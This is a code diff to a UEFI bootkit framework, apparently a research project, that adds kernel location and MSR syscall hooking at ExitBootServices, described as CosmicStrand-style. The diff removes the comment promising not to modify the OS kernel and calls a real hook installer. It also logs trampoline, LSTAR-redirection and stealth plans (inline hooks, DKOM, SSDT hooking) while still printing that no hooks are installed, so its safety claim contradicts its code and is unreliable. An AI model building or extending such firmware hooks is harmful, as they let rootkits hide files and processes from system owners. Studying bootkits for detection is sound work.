@@ -10,6 +10,8 @@
 **/
 
 #include "ExitBootHook.h"
+#include "MemoryScanner.h"
+#include "MsrHook.h"
 
 //
 // Global hook context
@@ -22,6 +24,18 @@ STATIC EXIT_BOOT_HOOK_CONTEXT  mExitBootContext = {
   .RuntimeMemorySize    = 0,
   .HookTime             = 0,
   .ExitBootTime         = 0
+};
+
+//
+// MSR hook context
+//
+STATIC MSR_HOOK_CONTEXT  mMsrContext = {
+  .OriginalLstar        = 0,
+  .OriginalCstar        = 0,
+  .OriginalSysenterEip  = 0,
+  .HookAddress          = 0,
+  .HooksInstalled       = FALSE,
+  .HookCount            = 0
 };
 
 /**
@@ -189,6 +203,18 @@ HookedExitBootServices (
   }
 
   //
+  // Install MSR hooks (Phase 5: CosmicStrand-style syscall interception)
+  //
+  DEBUG ((DEBUG_INFO, "[ExitBoot] Installing MSR hooks...\n"));
+  Status = InstallMsrHooks (&mMsrContext);
+  if (EFI_ERROR (Status)) {
+    DEBUG ((DEBUG_ERROR, "[ExitBoot] Failed to install MSR hooks: %r\n", Status));
+  } else {
+    DEBUG ((DEBUG_INFO, "[ExitBoot] MSR hooks installed successfully\n"));
+    LogMsrValues (&mMsrContext);
+  }
+
+  //
   // Log successful preparation
   //
   DEBUG ((DEBUG_INFO, "[ExitBoot] Payload prepared for OS transition\n"));
@@ -288,24 +314,13 @@ PreparePayloadForRuntime (
   IN EXIT_BOOT_HOOK_CONTEXT  *Context
   )
 {
+  EFI_STATUS  Status;
+  VOID        *KernelBase;
+  UINTN       KernelSize;
+
   if (Context == NULL || Context->RuntimeMemory == NULL) {
     return EFI_INVALID_PARAMETER;
   }
-
-  //
-  // In a real bootkit implementation, this function would:
-  //
-  // 1. Locate the OS kernel image in memory
-  // 2. Parse PE/ELF headers to find entry point
-  // 3. Install inline hooks in kernel functions
-  // 4. Set up MSR hooks for system calls (if modeling that TTP)
-  // 5. Prepare stealth mechanisms
-  //
-  // For Aegis-Boot research purposes, we:
-  // - Document what would happen
-  // - Log telemetry for detection research
-  // - Do NOT actually modify the OS kernel
-  //
 
   DEBUG ((DEBUG_INFO, "[ExitBoot] === Payload Preparation (Research Mode) ===\n"));
   DEBUG ((DEBUG_INFO, "[ExitBoot] Runtime memory verified: 0x%p\n", Context->RuntimeMemory));
@@ -320,19 +335,77 @@ PreparePayloadForRuntime (
   }
 
   //
-  // Log what a real bootkit would do here
+  // Step 1: Locate OS kernel in memory
   //
-  DEBUG ((DEBUG_INFO, "[ExitBoot] In production bootkit, would:\n"));
-  DEBUG ((DEBUG_INFO, "[ExitBoot]   1. Locate OS kernel in memory\n"));
-  DEBUG ((DEBUG_INFO, "[ExitBoot]   2. Parse kernel headers\n"));
-  DEBUG ((DEBUG_INFO, "[ExitBoot]   3. Install kernel hooks\n"));
-  DEBUG ((DEBUG_INFO, "[ExitBoot]   4. Set up MSR hooks (if enabled)\n"));
-  DEBUG ((DEBUG_INFO, "[ExitBoot]   5. Activate stealth mechanisms\n"));
+  DEBUG ((DEBUG_INFO, "[ExitBoot] Step 1: Locating OS kernel in memory...\n"));
+  Status = LocateOsKernel (&KernelBase, &KernelSize);
+  
+  if (!EFI_ERROR (Status)) {
+    DEBUG ((DEBUG_INFO, "[ExitBoot] ✓ OS Kernel located successfully!\n"));
+    DEBUG ((DEBUG_INFO, "[ExitBoot]   Base Address: 0x%p\n", KernelBase));
+    DEBUG ((DEBUG_INFO, "[ExitBoot]   Size: 0x%lx bytes (%lu KB)\n",
+            KernelSize, KernelSize / 1024));
+
+    //
+    // Step 2: Identify kernel type
+    //
+    DEBUG ((DEBUG_INFO, "[ExitBoot] Step 2: Identifying kernel type...\n"));
+    if (IsPeHeader (KernelBase)) {
+      DEBUG ((DEBUG_INFO, "[ExitBoot] ✓ Windows PE kernel detected (ntoskrnl.exe)\n"));
+      DEBUG ((DEBUG_INFO, "[ExitBoot]   In production bootkit, would:\n"));
+      DEBUG ((DEBUG_INFO, "[ExitBoot]   - Parse PE exports to find NtCreateFile\n"));
+      DEBUG ((DEBUG_INFO, "[ExitBoot]   - Install inline hook on NtCreateFile\n"));
+      DEBUG ((DEBUG_INFO, "[ExitBoot]   - Hook NtReadFile for file hiding\n"));
+      DEBUG ((DEBUG_INFO, "[ExitBoot]   - Hook NtQuerySystemInformation for process hiding\n"));
+    } else if (IsElfHeader (KernelBase)) {
+      DEBUG ((DEBUG_INFO, "[ExitBoot] ✓ Linux ELF kernel detected (vmlinuz)\n"));
+      DEBUG ((DEBUG_INFO, "[ExitBoot]   In production bootkit, would:\n"));
+      DEBUG ((DEBUG_INFO, "[ExitBoot]   - Parse ELF symbols to find sys_open\n"));
+      DEBUG ((DEBUG_INFO, "[ExitBoot]   - Install inline hook on sys_open\n"));
+      DEBUG ((DEBUG_INFO, "[ExitBoot]   - Hook sys_read for file hiding\n"));
+      DEBUG ((DEBUG_INFO, "[ExitBoot]   - Hook sys_getdents for directory hiding\n"));
+    }
+
+    //
+    // Step 3: Document hook installation points
+    //
+    DEBUG ((DEBUG_INFO, "[ExitBoot] Step 3: Hook installation (RESEARCH MODE)\n"));
+    DEBUG ((DEBUG_INFO, "[ExitBoot]   Hook Pattern: MOV RAX, 0x%p; JMP RAX\n",
+            Context->RuntimeMemory));
+    DEBUG ((DEBUG_INFO, "[ExitBoot]   Trampoline Size: 14 bytes\n"));
+    DEBUG ((DEBUG_INFO, "[ExitBoot]   Original bytes would be saved at: 0x%p\n",
+            (UINT8 *)Context->RuntimeMemory + 0x100));
+
+    //
+    // Step 4: MSR hooking (if enabled)
+    //
+    DEBUG ((DEBUG_INFO, "[ExitBoot] Step 4: MSR hook setup (RESEARCH MODE)\n"));
+    DEBUG ((DEBUG_INFO, "[ExitBoot]   Would redirect IA32_LSTAR (MSR 0xC0000082)\n"));
+    DEBUG ((DEBUG_INFO, "[ExitBoot]   Syscall entry point would be: 0x%p\n",
+            Context->RuntimeMemory));
+
+    //
+    // Step 5: Stealth mechanisms
+    //
+    DEBUG ((DEBUG_INFO, "[ExitBoot] Step 5: Stealth mechanisms (RESEARCH MODE)\n"));
+    DEBUG ((DEBUG_INFO, "[ExitBoot]   - DKOM (Direct Kernel Object Manipulation)\n"));
+    DEBUG ((DEBUG_INFO, "[ExitBoot]   - SSDT/IDT hooking\n"));
+    DEBUG ((DEBUG_INFO, "[ExitBoot]   - Process/thread hiding\n"));
+    DEBUG ((DEBUG_INFO, "[ExitBoot]   - File system filter driver\n"));
+
+  } else {
+    DEBUG ((DEBUG_WARN, "[ExitBoot] ✗ Could not locate OS kernel: %r\n", Status));
+    DEBUG ((DEBUG_WARN, "[ExitBoot]   This may be expected in some boot scenarios\n"));
+  }
+
   DEBUG ((DEBUG_INFO, "[ExitBoot] === End Payload Preparation ===\n"));
+  DEBUG ((DEBUG_INFO, "[ExitBoot] NOTE: This is RESEARCH MODE - no actual hooks installed\n"));
 
   //
-  // For research, we just mark success
+  // Log telemetry for detection research
   //
+  LogExitBootTelemetry (L"Payload preparation complete - kernel located and analyzed");
+
   return EFI_SUCCESS;
 }
 
